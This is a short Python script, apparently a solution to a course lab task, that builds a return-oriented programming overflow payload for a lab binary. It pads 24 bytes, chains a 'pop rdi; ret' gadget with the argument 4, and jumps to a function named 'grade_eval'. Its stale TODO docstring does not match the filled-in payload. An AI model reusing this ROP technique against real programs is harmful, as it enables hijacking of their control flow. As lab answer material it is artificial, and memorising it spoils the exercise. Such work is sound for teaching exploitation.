#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

payload  = b"A" * 24
payload += b"\x33\x1a\x40\x00\x00\x00\x00\x00"   # 0x401a33  pop rdi; ret
payload += b"\x04\x00\x00\x00\x00\x00\x00\x00"   # 4
payload += b"\x78\x19\x40\x00\x00\x00\x00\x00"   # 0x401978  grade_eval
payload += b"\x0a"

sys.stdout.buffer.write(payload)
